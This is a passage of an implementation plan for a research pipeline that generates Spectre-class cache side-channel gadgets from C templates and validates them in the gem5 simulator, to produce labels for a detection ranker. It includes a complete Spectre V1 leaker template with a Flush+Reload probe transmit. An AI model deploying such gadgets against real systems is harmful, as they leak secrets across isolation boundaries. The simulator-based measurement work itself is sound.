# Phase 4 — Synthesized-Gadget gem5 Oracle Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

> **SCOPE (revised 2026-07-28):** The original plan validated the c_vulns corpus. Inspection showed only 21 c_vulns files are runnable and the 1406 `.s` / 530 variant `.c` "samples" are pattern-exemplar fragments with **no secret→transmit dataflow** — a Flush+Reload oracle has nothing to measure on them. Revised target: **synthesize ~450 complete leaking gadgets** (25 × 9 classes × 2 arches) from hand-verified per-class templates mutated by semantics-preserving knobs, then gem5-validate each. The gem5 execution+signal machinery is unchanged; only the input is synthesized instead of catalogued. See the spec's SCOPE REVISION box: `docs/superpowers/specs/2026-07-28-phase4-gem5-oracle-design.md`.

**Goal:** Generate a corpus of complete, runnable speculative-execution gadgets (real secret→speculative-load→`probe[secret*stride]`→measure), run each in gem5 (speculative O3 vs in-order control), and emit `oracle/results/synth_leak_labels.jsonl` — a set of gem5-confirmed leaking gadgets with a continuous `leak_signal` for the parked Phase 3 ranker.

**Architecture:** New `gen/synth/` generator: per-class C templates (distilled from the repo's canonical PoCs, which reuse `c_vulns/c_code/utils.c`) with format-placeholder knobs; a mutation engine samples N knob-tuples per (class, arch) via semantics-preserving augmentation categories (secret value, training iterations, speculation-window nop padding, safe statement reorder) so every output is a complete leaker by construction. Rendered gadgets are compiled static and run through the existing gem5 SE oracle in a Docker `linux/arm64` container (guest ISA is a build-time choice — no x86-on-arm emulation). The pure-Python analysis units (manifest, parser, leak-signal) are built/were built TDD-first with no gem5 dependency.

**Tech Stack:** Python 3, pytest, gem5 (stdlib `gem5.components` SE-mode API, CPUTypes.O3 / CPUTypes.TIMING), Docker, glibc-static, numpy, C (gadget templates + `utils.c`).

## Global Constraints

- **Do NOT modify** classifier / spec code (`v54/`, `spec/`). Generated gadgets live under `gen/synth/`; oracle logic under `oracle/`.
- **The only shared C edit** allowed is `c_vulns/c_code/utils.c`, guarded by `#ifdef GEM5_ORACLE` so the non-oracle build is byte-identical (Task 6). Templates `#include "utils.c"` for the probe array + `perform_measurement`.
- **Every synthesized gadget is a complete leaker by construction:** it MUST contain a planted secret, use `probe_array` from `utils.c`, perform a `probe_array[value * CACHE_LINE_SIZE] = 1` transmit on a speculatively-read value, and call `perform_measurement(secret, name)`. Mutation knobs never remove these.
- **Measurement compatibility:** `perform_measurement` (utils.c) scans 256 lines at stride `CACHE_LINE_SIZE` (64). Gadgets MUST transmit at that same stride — the stride is NOT a mutation knob.
- **ISA scope:** x86_64 first (Tasks 1–11), then arm64 (Task 12). RISC-V excluded.
- **leak_signal := `max(0.0, snr_o3 - snr_inorder)`**. **binary leak := `recovered_ok and (snr_o3 - snr_inorder) > TAU`**. `TAU` is one module-level constant in `oracle/leak_signal.py`, calibrated once from controls (Task 10), never per-class.
- **Probe array:** 256 lines × 64 B; the secret byte value is the transmitted line index.
- **gem5 adjudicability honesty (spec coverage table):** every emitted per-class result carries an `adjudicable` tag (`yes`/`partial`/`no`); the aggregate "confirmed-leaking fraction" is reported ONLY over `adjudicable=="yes"` classes; `no`/`partial` classes are listed separately as coverage gaps. Never report an unqualified "N% confirmed." SPECTRE_V1=yes, SPECTRE_V4/V2/RETBLEED=partial, BHI/INCEPTION/L1TF/MDS=no, BENIGN=yes.
- **All commits** end with: `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`.
- Container tag: `specdiscover-gem5:pinned`. gem5 pinned to tag `v24.0.0.0`.
- **Test imports:** a shared `tests/conftest.py` puts the repo root on `sys.path`. Do NOT add `tests/oracle/__init__.py` or `tests/gen/__init__.py` — they shift pytest's rootdir and break `import oracle` / `import gen`.

---

## File Structure

- `oracle/manifest.py` — `LeakRecord` dataclass + jsonl I/O. **[DONE, Task 1]**
- `oracle/parse_poc.py` — parse gem5 stdout → `PocResult`. **[DONE, Task 2]**
- `oracle/leak_signal.py` — `snr()`, `leak_signal()`, `is_leak()`, `TAU`.
- `gen/synth/__init__.py` — package marker.
- `gen/synth/params.py` — `GadgetParams` schema + `ADJUDICABLE` class table.
- `gen/synth/templates.py` — per-(class,arch) C template strings with knob placeholders + `render(params) -> str`.
- `gen/synth/generate.py` — mutation engine: sample N knob-tuples per (class,arch), render → `gen/synth/out/*.c`, write `gen/synth/out/gadgets.jsonl` index.
- `oracle/docker/Dockerfile`, `oracle/docker/build_image.sh` — pinned gem5 (X86+ARM) + static toolchains.
- `oracle/gem5_se.py` — gem5 SE config (runs inside gem5), `--cpu {o3,timing}` `--isa {x86,arm}`.
- `oracle/compile_gadget.sh` — compile one gadget static, inside the container.
- `oracle/run_oracle.py` — host driver: compile a gadget, run o3+timing, build a `LeakRecord`.
- `oracle/validate_oracle.py` — controls + batch + per-class adjudicability report.
- `oracle/results/synth_leak_labels.jsonl` — output manifest (git-ignored; committed sample).
- `c_vulns/c_code/utils.c` — shared `#ifdef GEM5_ORACLE` latency-vector print (Task 6).
- `tests/oracle/`, `tests/gen/` — pytest.

---

### Task 1: Package scaffold + manifest schema  **[DONE — commit 4577f4f]**

`LeakRecord` dataclass + `write_manifest`/`read_manifest` in `oracle/manifest.py`, with `tests/oracle/test_manifest.py`. Complete and review-clean. No action.

---

### Task 2: PoC/gadget stdout parser  **[DONE — commit 4471c94]**

`parse_poc_output(stdout) -> PocResult(.latencies[256], .recovered_byte, .success, .actual_secret)` in `oracle/parse_poc.py`, with `tests/oracle/test_parse_poc.py`. Complete and review-clean. No action.

---

### Task 3: leak_signal math

**Files:**
- Create: `oracle/leak_signal.py`
- Test: `tests/oracle/test_leak_signal.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `TAU: float`; `snr(latencies: list[float], secret_line: int) -> float`; `leak_signal(snr_o3: float, snr_inorder: float) -> float`; `is_leak(recovered_ok: bool, snr_o3: float, snr_inorder: float) -> bool`.

- [ ] **Step 1: Write the failing test**

```python
# tests/oracle/test_leak_signal.py
import math
from oracle.leak_signal import snr, leak_signal, is_leak, TAU

def test_snr_high_when_secret_line_faster():
    lat = [200.0] * 256
    lat[83] = 40.0
    assert snr(lat, 83) > 10.0

def test_snr_low_when_uniform():
    lat = [200.0] * 256
    assert abs(snr(lat, 83)) < 1e-6

def test_snr_ignores_nan_lines():
    lat = [float("nan")] * 256
    lat[83] = 40.0
    for i in (10, 20, 30):
        lat[i] = 200.0
    assert snr(lat, 83) > 5.0

def test_leak_signal_is_speculative_delta_clamped():
    assert leak_signal(8.0, 0.2) == 8.0 - 0.2
    assert leak_signal(0.2, 8.0) == 0.0

def test_is_leak_requires_recovery_and_margin():
    assert is_leak(True, 8.0, 0.1) is True
    assert is_leak(False, 8.0, 0.1) is False
    assert is_leak(True, TAU + 0.05, 0.0) is True
    assert is_leak(True, TAU - 0.05, 0.0) is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_leak_signal.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'oracle.leak_signal'`

- [ ] **Step 3: Write minimal implementation**

```python
# oracle/leak_signal.py
from __future__ import annotations
import math
import numpy as np

# Calibrated once from the positive/negative controls in Task 10. Provisional;
# validate_oracle.py asserts the controls separate cleanly around it.
TAU = 3.0

def snr(latencies, secret_line: int) -> float:
    arr = np.array(latencies, dtype=float)
    finite = np.isfinite(arr)
    if not finite[secret_line]:
        return 0.0
    others_mask = finite.copy()
    others_mask[secret_line] = False
    others = arr[others_mask]
    if others.size == 0:
        return 0.0
    mu = float(np.mean(others))
    sd = float(np.std(others))
    diff = mu - float(arr[secret_line])
    if sd < 1e-9:
        return 0.0 if abs(diff) < 1e-9 else math.copysign(1e3, diff)
    return diff / sd

def leak_signal(snr_o3: float, snr_inorder: float) -> float:
    return max(0.0, snr_o3 - snr_inorder)

def is_leak(recovered_ok: bool, snr_o3: float, snr_inorder: float) -> bool:
    return bool(recovered_ok) and (snr_o3 - snr_inorder) > TAU
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_leak_signal.py -v`
Expected: PASS (5 passed)

- [ ] **Step 5: Commit**

```bash
git add oracle/leak_signal.py tests/oracle/test_leak_signal.py
git commit -m "feat(oracle): SNR + speculative-delta leak_signal + binary threshold

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 4: Gadget parameter schema + template library

Per-(class, arch) C templates with `str.format` knob placeholders. Every template is distilled from the repo's existing canonical PoC for that class (e.g. `c_vulns/c_code/spectre_1.c`, `mds.c`, `l1tf.c`, `bhi.c`, `retbleed.c`, `inception.c`, and their `*_arm64.c` counterparts) — those are known-good complete leakers that already `#include "utils.c"`. The template preserves the secret + `probe_array` transmit + `perform_measurement` call, and exposes knobs `{secret}`, `{train_iters}`, `{pad_nops}`, `{reorder}` (see `render`).

**Files:**
- Create: `gen/synth/__init__.py` (empty)
- Create: `gen/synth/params.py`
- Create: `gen/synth/templates.py`
- Create: `tests/gen/test_templates.py`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `params.py`: `GadgetParams` dataclass (`vuln_class, arch, secret:int, train_iters:int, pad_nops:int, reorder:bool, variant_idx:int`); `ADJUDICABLE: dict[str,str]`; `CLASSES: list[str]` (the 9); `ARCHES = ["x86_64","arm64"]`.
  - `templates.py`: `TEMPLATES: dict[tuple[str,str], str]` keyed by `(vuln_class, arch)`; `render(p: GadgetParams) -> str` returning complete C source; `SPEC_WINDOW_MARK` — a comment marker string the pad-nops are injected at.

- [ ] **Step 1: Write the failing test**

```python
# tests/gen/test_templates.py
import pytest
from gen.synth.params import GadgetParams, CLASSES, ARCHES, ADJUDICABLE
from gen.synth.templates import TEMPLATES, render

def _p(cls="SPECTRE_V1", arch="x86_64", **kw):
    base = dict(vuln_class=cls, arch=arch, secret=83, train_iters=1000,
                pad_nops=0, reorder=False, variant_idx=0)
    base.update(kw)
    return GadgetParams(**base)

def test_all_nine_classes_both_arches_have_templates():
    assert set(CLASSES) == {"BENIGN","SPECTRE_V1","SPECTRE_V2","SPECTRE_V4",
                            "L1TF","MDS","RETBLEED","INCEPTION","BHI"}
    for cls in CLASSES:
        for arch in ARCHES:
            assert (cls, arch) in TEMPLATES, f"missing template {(cls,arch)}"

def test_rendered_gadget_has_leaker_structure():
    src = render(_p())
    assert '#include "utils.c"' in src
    assert "int main" in src
    assert "probe_array[" in src            # transmit
    assert "perform_measurement" in src     # measurement
    assert "CACHE_LINE_SIZE" in src         # stride locked to measurement

def test_secret_knob_is_planted():
    src = render(_p(secret=81))
    assert "81" in src
    # the secret must reach perform_measurement's expected arg
    assert "perform_measurement" in src

def test_pad_nops_injected_into_speculation_window():
    src0 = render(_p(pad_nops=0))
    src5 = render(_p(pad_nops=5))
    assert src5.count("nop") > src0.count("nop")

def test_benign_has_no_speculative_transmit_of_secret():
    # BENIGN still uses probe_array/measurement harness but its "gadget" never
    # transmits the secret speculatively -> must NOT recover the secret.
    src = render(_p(cls="BENIGN"))
    assert "perform_measurement" in src
    # benign template documents its non-leak intent
    assert "BENIGN" in src
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/gen/test_templates.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'gen.synth.params'`

- [ ] **Step 3: Write `params.py`**

```python
# gen/synth/params.py
from __future__ import annotations
from dataclasses import dataclass

CLASSES = ["BENIGN", "SPECTRE_V1", "SPECTRE_V2", "SPECTRE_V4",
           "L1TF", "MDS", "RETBLEED", "INCEPTION", "BHI"]
ARCHES = ["x86_64", "arm64"]

# gem5 adjudicability (spec coverage table)
ADJUDICABLE = {
    "SPECTRE_V1": "yes", "BENIGN": "yes",
    "SPECTRE_V4": "partial", "SPECTRE_V2": "partial", "RETBLEED": "partial",
    "BHI": "no", "INCEPTION": "no", "L1TF": "no", "MDS": "no",
}

@dataclass
class GadgetParams:
    vuln_class: str
    arch: str
    secret: int          # planted secret byte (0-255)
    train_iters: int     # branch/predictor training iterations
    pad_nops: int        # nops injected into the speculation window
    reorder: bool        # swap two independent training statements
    variant_idx: int     # index within (class,arch)
```

- [ ] **Step 4: Write `templates.py`**

Author one template per `(vuln_class, arch)` distilled from the class's canonical PoC. Each is a Python triple-quoted string using `str.format` placeholders `{secret}`, `{train_iters}`, `{pad}`, and a `{reorder_a}`/`{reorder_b}` pair for the two swappable training statements. Provide the SPECTRE_V1 x86_64 exemplar in full (distilled from `spectre_1.c`) and the BENIGN x86_64 exemplar in full; the remaining `(class,arch)` templates follow the same skeleton, distilled from the named canonical PoC, and are verified by the structural test above plus the compile check in Task 4 Step 6.

```python
# gen/synth/templates.py  (exemplars shown; author the remaining 16 to the same contract)
from __future__ import annotations
from gen.synth.params import GadgetParams

SPEC_WINDOW_MARK = "/*SPEC_WINDOW*/"

_V1_X86 = r'''
#include "utils.c"
// Synthesized SPECTRE_V1 gadget (bounds-check bypass). Complete leaker.
uint8_t public_array_v1[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
uint8_t secret_v1 = {secret};
uint8_t *g_arr = public_array_v1;
size_t   g_sz  = sizeof(public_array_v1);

__attribute__((noinline)) void spec_read(size_t index) {{
    if (index < g_sz) {{
        __asm__ __volatile__({pad} ::: "memory");
        volatile uint8_t value = g_arr[index];
        probe_array[value * CACHE_LINE_SIZE] = 1;
    }}
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    size_t oob = (size_t)(&secret_v1 - g_arr);
    spec_read(oob);
    _mm_lfence();
    perform_measurement(secret_v1, "SPECTRE_V1 secret");
    printf("Actual secret data: %c\n", secret_v1);
    return 0;
}}
'''

_BENIGN_X86 = r'''
#include "utils.c"
// Synthesized BENIGN gadget: exercises the harness but never speculatively
// transmits the secret. Must NOT recover the secret (negative control shape).
uint8_t secret_benign = {secret};
uint8_t public_b[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    // Only ever transmit a PUBLIC value, never the secret.
    volatile uint8_t v = public_b[secret_benign % 16];
    probe_array[v * CACHE_LINE_SIZE] = 1;
    __asm__ __volatile__({pad} ::: "memory");
    _mm_lfence();
    perform_measurement(secret_benign, "BENIGN secret");
    printf("Actual secret data: %c\n", secret_benign);
    return 0;
}}
'''

# (class, arch) -> template. Remaining 16 authored to the same contract from
# the canonical PoCs: SPECTRE_V2->spectre_2.c, SPECTRE_V4->new STL template,
# L1TF->l1tf.c, MDS->mds.c, RETBLEED->retbleed.c, INCEPTION->inception.c,
# BHI->bhi.c, and each *_arm64.c for arch="arm64" (arm pad = "\"nop\\n\"" units,
# fences dsb/isb via utils_arm64 equivalents).
TEMPLATES = {
    ("SPECTRE_V1", "x86_64"): _V1_X86,
    ("BENIGN", "x86_64"): _BENIGN_X86,
    # ("SPECTRE_V2","x86_64"): _V2_X86, ... etc (author all 18)
}

def _pad_asm(pad_nops: int) -> str:
    if pad_nops <= 0:
        return '""'
    return '"' + ("nop\\n\\t" * pad_nops) + '"'

def render(p: GadgetParams) -> str:
    tmpl = TEMPLATES[(p.vuln_class, p.arch)]
    # two independent, swappable training statements (safe reorder invariant)
    train = 'spec_read(i % g_sz);' if p.vuln_class == "SPECTRE_V1" else '(void)i;'
    stmt_a = train
    stmt_b = '_mm_lfence();'
    a, b = (stmt_b, stmt_a) if p.reorder else (stmt_a, stmt_b)
    return tmpl.format(secret=p.secret, train_iters=p.train_iters,
                       pad=_pad_asm(p.pad_nops), reorder_a=a, reorder_b=b)
```

Note for the implementer: the `render` helper above is the SPECTRE_V1/BENIGN shape. Each class's training/gadget statements differ — keep `render` a thin dispatcher that picks the class-appropriate `{reorder_a}/{reorder_b}` statements (a small per-class dict of `(stmt_a, stmt_b, extra_format_kwargs)`), so all 18 templates render through one function. Do NOT duplicate `render` per class.

- [ ] **Step 5: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/gen/test_templates.py -v`
Expected: PASS (5 passed) once all 18 `(class,arch)` templates are present.

- [ ] **Step 6: Compile-smoke every template (native or note deferral)**

Run:
```bash
cd /Users/ritvikgupta/SpecExec && python -c "
from gen.synth.params import GadgetParams, CLASSES, ARCHES
from gen.synth.templates import render
import subprocess, tempfile, os
for cls in CLASSES:
    for arch in ARCHES:
        if arch != 'x86_64':  # native host is arm64; x86 templates compile-check in the container (Task 8)
            continue
        src = render(GadgetParams(cls, arch, 83, 100, 2, False, 0))
        print(cls, arch, 'rendered', len(src), 'bytes')
"
```
Expected: every x86_64 class renders without a `KeyError`/`format` error. Full compile is verified in the container in Task 9 (host is arm64; `utils.c` uses x86 intrinsics). If any template raises a format/KeyError, fix that template's placeholders.

- [ ] **Step 7: Commit**

```bash
git add gen/synth/__init__.py gen/synth/params.py gen/synth/templates.py tests/gen/test_templates.py
git commit -m "feat(synth): per-class gadget templates + render (18 class/arch templates)

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 5: Mutation generator

Sample N=25 distinct knob-tuples per (class, arch) using the semantics-preserving augmentation categories, render each, write to `gen/synth/out/<class>_<arch>_<i>.c` and an index `gen/synth/out/gadgets.jsonl`.

**Files:**
- Create: `gen/synth/generate.py`
- Test: `tests/gen/test_generate.py`

**Interfaces:**
- Consumes: `GadgetParams`, `CLASSES`, `ARCHES` (T4); `render` (T4).
- Produces: `sample_params(vuln_class, arch, n, seed) -> list[GadgetParams]` (n distinct); `generate(out_dir, n_per_class, seed) -> list[dict]` writing `<class>_<arch>_<i>.c` + `gadgets.jsonl` (each row: `gadget_id, path, vuln_class, arch, secret, adjudicable`).

- [ ] **Step 1: Write the failing test**

```python
# tests/gen/test_generate.py
import os, json
from gen.synth.generate import sample_params, generate
from gen.synth.params import CLASSES, ARCHES

def test_sample_params_distinct():
    ps = sample_params("SPECTRE_V1", "x86_64", 25, seed=0)
    assert len(ps) == 25
    keys = {(p.secret, p.train_iters, p.pad_nops, p.reorder) for p in ps}
    assert len(keys) == 25            # all distinct knob-tuples
    assert all(p.vuln_class == "SPECTRE_V1" for p in ps)
    assert all(0 <= p.secret <= 255 for p in ps)

def test_sample_params_deterministic_by_seed():
    a = sample_params("MDS", "arm64", 10, seed=7)
    b = sample_params("MDS", "arm64", 10, seed=7)
    assert [(p.secret, p.pad_nops) for p in a] == [(p.secret, p.pad_nops) for p in b]

def test_generate_writes_files_and_index(tmp_path):
    rows = generate(str(tmp_path), n_per_class=3, seed=0)
    assert len(rows) == len(CLASSES) * len(ARCHES) * 3
    idx = os.path.join(str(tmp_path), "gadgets.jsonl")
    assert os.path.exists(idx)
    with open(idx) as f:
        lines = [json.loads(l) for l in f if l.strip()]
    assert len(lines) == len(rows)
    # every referenced .c exists and carries an adjudicable tag
    for r in lines:
        assert os.path.exists(r["path"])
        assert r["adjudicable"] in ("yes", "partial", "no")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/gen/test_generate.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'gen.synth.generate'`

- [ ] **Step 3: Write minimal implementation**

```python
# gen/synth/generate.py
from __future__ import annotations
import os, json, random
from gen.synth.params import GadgetParams, CLASSES, ARCHES, ADJUDICABLE
from gen.synth.templates import render

def sample_params(vuln_class, arch, n, seed=0):
    rng = random.Random((hash((vuln_class, arch, seed)) & 0xffffffff))
    seen = set()
    out = []
    # deterministic distinct knob-tuples
    while len(out) < n:
        secret = rng.randint(1, 254)
        train_iters = rng.choice([200, 500, 1000, 2000])
        pad_nops = rng.randint(0, 8)
        reorder = rng.random() < 0.5
        key = (secret, train_iters, pad_nops, reorder)
        if key in seen:
            continue
        seen.add(key)
        out.append(GadgetParams(vuln_class, arch, secret, train_iters,
                                pad_nops, reorder, variant_idx=len(out)))
    return out

def generate(out_dir, n_per_class=25, seed=0):
    os.makedirs(out_dir, exist_ok=True)
    rows = []
    for cls in CLASSES:
        for arch in ARCHES:
            for p in sample_params(cls, arch, n_per_class, seed):
                gid = f"{cls}_{arch}_{p.variant_idx}"
                path = os.path.join(out_dir, gid + ".c")
                with open(path, "w") as f:
                    f.write(render(p))
                rows.append({"gadget_id": gid, "path": path,
                             "vuln_class": cls, "arch": arch,
                             "secret": p.secret,
                             "adjudicable": ADJUDICABLE.get(cls, "no")})
    with open(os.path.join(out_dir, "gadgets.jsonl"), "w") as f:
        for r in rows:
            f.write(json.dumps(r, sort_keys=True) + "\n")
    return rows
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/gen/test_generate.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
echo "gen/synth/out/" >> .gitignore
git add gen/synth/generate.py tests/gen/test_generate.py .gitignore
git commit -m "feat(synth): mutation generator — N distinct knob-tuples per class/arch

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 6: Shared gem5 instrumentation in utils.c

Add a `#ifdef GEM5_ORACLE` block to `perform_measurement` in `c_vulns/c_code/utils.c` that prints every line's access time (`LINE <i> <cycles>`) before the threshold logic. Only shared C edit; default build unchanged.

**Files:**
- Modify: `c_vulns/c_code/utils.c` (the 256-line loop in `perform_measurement`)
- Test: `tests/oracle/test_utils_instrumentation.py`

**Interfaces:**
- Produces: instrumented `perform_measurement` emitting `LINE i t` under `-DGEM5_ORACLE`.

- [ ] **Step 1: Write the failing test**

```python
# tests/oracle/test_utils_instrumentation.py
import os, subprocess, tempfile, textwrap, shutil, platform, pytest

UTILS = os.path.join("c_vulns", "c_code", "utils.c")

@pytest.mark.skipif(platform.machine() == "arm64",
                    reason="utils.c uses x86 intrinsics; verified in container (Task 9)")
@pytest.mark.skipif(shutil.which("cc") is None, reason="no C compiler")
def test_gem5_oracle_prints_all_256_lines(tmp_path):
    driver = tmp_path / "drv.c"
    driver.write_text(textwrap.dedent(f'''
        #define GEM5_ORACLE 1
        #include "{os.path.abspath(UTILS)}"
        int main() {{
            probe_array[83 * CACHE_LINE_SIZE] = 1;
            perform_measurement((uint8_t)83, "test secret");
            return 0;
        }}
    '''))
    exe = tmp_path / "drv"
    subprocess.run(["cc", "-O0", str(driver), "-o", str(exe)], check=True)
    out = subprocess.run([str(exe)], capture_output=True, text=True).stdout
    line_ids = {int(l.split()[1]) for l in out.splitlines() if l.startswith("LINE ")}
    assert line_ids == set(range(256))
```

- [ ] **Step 2: Run test to verify it fails (or skips on arm64)**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_utils_instrumentation.py -v`
Expected: on arm64 host it SKIPS (documented); the real assertion runs in the container in Task 9. On an x86 host it FAILs before the edit.

- [ ] **Step 3: Edit `c_vulns/c_code/utils.c`**

The existing loop reads:

```c
    for (int i = 0; i < NUM_CACHE_LINES; i++) {
        volatile uint8_t *addr = &probe_array[i * CACHE_LINE_SIZE];
        long long access_time = measure_access_time(addr);

        if (access_time < CACHE_HIT_THRESHOLD && (min_time == -1 || access_time < min_time)) {
```

Insert the print immediately after the `access_time` assignment:

```c
    for (int i = 0; i < NUM_CACHE_LINES; i++) {
        volatile uint8_t *addr = &probe_array[i * CACHE_LINE_SIZE];
        long long access_time = measure_access_time(addr);
#ifdef GEM5_ORACLE
        printf("LINE %d %lld\n", i, access_time);
#endif

        if (access_time < CACHE_HIT_THRESHOLD && (min_time == -1 || access_time < min_time)) {
```

- [ ] **Step 4: Run test to verify it passes (or skips on arm64)**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_utils_instrumentation.py -v`
Expected: PASS on x86 host; SKIP on arm64 host (verified later in container).

- [ ] **Step 5: Commit**

```bash
git add c_vulns/c_code/utils.c tests/oracle/test_utils_instrumentation.py
git commit -m "feat(oracle): GEM5_ORACLE full-latency-vector print in utils.c (shared, guarded)

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 7: Docker image with pinned gem5 (X86)

Container with gem5 (X86 guest) + static-capable gcc. Verified by smoke run.

**Files:**
- Create: `oracle/docker/Dockerfile`
- Create: `oracle/docker/build_image.sh`

**Interfaces:**
- Produces: image `specdiscover-gem5:pinned` with `/gem5/build/X86/gem5.opt`, `/gem5/configs`, and `gcc` supporting `-static`.

- [ ] **Step 1: Write the Dockerfile**

```dockerfile
# oracle/docker/Dockerfile
FROM ghcr.io/gem5/ubuntu-24.04_all-dependencies:latest AS build
ARG GEM5_TAG=v24.0.0.0
RUN git clone --depth 1 --branch ${GEM5_TAG} https://github.com/gem5/gem5.git /gem5
WORKDIR /gem5
RUN python3 $(which scons) build/X86/gem5.opt -j"$(nproc)"
RUN apt-get update && apt-get install -y gcc libc6-dev && rm -rf /var/lib/apt/lists/*
WORKDIR /work
```

- [ ] **Step 2: Write the build script**

```bash
# oracle/docker/build_image.sh
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
docker buildx build --platform linux/arm64 \
  --build-arg GEM5_TAG=v24.0.0.0 \
  -t specdiscover-gem5:pinned \
  --load .
```

- [ ] **Step 3: Build the image**

Run: `cd /Users/ritvikgupta/SpecExec && chmod +x oracle/docker/build_image.sh && ./oracle/docker/build_image.sh`
Expected: builds (long — gem5 compile). If the base image has no arm64 manifest, fall back to `FROM ubuntu:24.04` + gem5's documented apt dependency list before the clone.

- [ ] **Step 4: Smoke-verify gem5**

Run: `docker run --rm specdiscover-gem5:pinned /gem5/build/X86/gem5.opt --version`
Expected: prints `gem5 version 24.0.0.0`.

- [ ] **Step 5: Commit**

```bash
git add oracle/docker/Dockerfile oracle/docker/build_image.sh
git commit -m "build(oracle): pinned gem5 X86 docker image (arm64 host)

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 8: gem5 SE config + compile helper + smoke on one synthesized gadget

`oracle/gem5_se.py` runs inside gem5 (stdlib components), `--cpu {o3,timing}` `--isa {x86,arm}`. `oracle/compile_gadget.sh` compiles one rendered `.c` static with `-DGEM5_ORACLE`.

**Files:**
- Create: `oracle/gem5_se.py`
- Create: `oracle/compile_gadget.sh`

**Interfaces:**
- Consumes: image (T7), instrumented `utils.c` (T6), rendered gadgets (T5).
- Produces: `gem5.opt oracle/gem5_se.py --binary <p> --cpu {o3,timing} --isa {x86,arm}` runs the gadget and forwards stdout.

- [ ] **Step 1: Write the gem5 config**

```python
# oracle/gem5_se.py  (executed by gem5.opt)
import argparse
from gem5.components.boards.simple_board import SimpleBoard
from gem5.components.cachehierarchies.classic.private_l1_private_l2_cache_hierarchy import (
    PrivateL1PrivateL2CacheHierarchy,
)
from gem5.components.memory import SingleChannelDDR3_1600
from gem5.components.processors.simple_processor import SimpleProcessor
from gem5.components.processors.cpu_types import CPUTypes
from gem5.isas import ISA
from gem5.resources.resource import BinaryResource
from gem5.simulate.simulator import Simulator

p = argparse.ArgumentParser()
p.add_argument("--binary", required=True)
p.add_argument("--cpu", choices=["o3", "timing"], required=True)
p.add_argument("--isa", choices=["x86", "arm"], default="x86")
args = p.parse_args()

cpu_type = CPUTypes.O3 if args.cpu == "o3" else CPUTypes.TIMING
isa = ISA.X86 if args.isa == "x86" else ISA.ARM

cache = PrivateL1PrivateL2CacheHierarchy(l1d_size="32KiB", l1i_size="32KiB", l2_size="256KiB")
memory = SingleChannelDDR3_1600(size="512MiB")
processor = SimpleProcessor(cpu_type=cpu_type, isa=isa, num_cores=1)
board = SimpleBoard(clk_freq="3GHz", processor=processor, memory=memory, cache_hierarchy=cache)
board.set_se_binary_workload(BinaryResource(local_path=args.binary))

sim = Simulator(board=board)
sim.run()
print(f"gem5-exit: {sim.get_last_exit_event_cause()}")
```

- [ ] **Step 2: Write the compile helper**

```bash
# oracle/compile_gadget.sh   (runs inside the container; /work is the repo mount)
#!/usr/bin/env bash
set -euo pipefail
SRC="$1"; OUT="$2"; CC="${3:-gcc}"
mkdir -p "$(dirname "$OUT")"
# gadgets #include "utils.c"; -I the c_code dir; enable LINE print; static for SE mode
"$CC" -O0 -static -DGEM5_ORACLE -I /work/c_vulns/c_code "$SRC" -o "$OUT"
```

- [ ] **Step 3: Generate a small gadget set, then compile one in the container**

Run:
```bash
cd /Users/ritvikgupta/SpecExec && python -c "from gen.synth.generate import generate; generate('gen/synth/out', n_per_class=2, seed=0)"
docker run --rm -v /Users/ritvikgupta/SpecExec:/work specdiscover-gem5:pinned \
  bash /work/oracle/compile_gadget.sh /work/gen/synth/out/SPECTRE_V1_x86_64_0.c /work/oracle/build/v1_0
```
Expected: exits 0, creates `oracle/build/v1_0`. This also confirms the Task 6 utils.c edit compiles under the container's x86 toolchain.

- [ ] **Step 4: Smoke-run under both CPUs**

Run:
```bash
docker run --rm -v /Users/ritvikgupta/SpecExec:/work specdiscover-gem5:pinned bash -lc \
 '/gem5/build/X86/gem5.opt /work/oracle/gem5_se.py --binary /work/oracle/build/v1_0 --cpu o3 --isa x86 2>/dev/null | grep -c "^LINE "'
```
Expected: prints `256`. Repeat with `--cpu timing`; also `256`.

- [ ] **Step 5: Commit**

```bash
git add oracle/gem5_se.py oracle/compile_gadget.sh
git commit -m "feat(oracle): gem5 SE config (O3/timing, x86/arm) + gadget compile helper

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 9: Host driver — one gadget to a LeakRecord

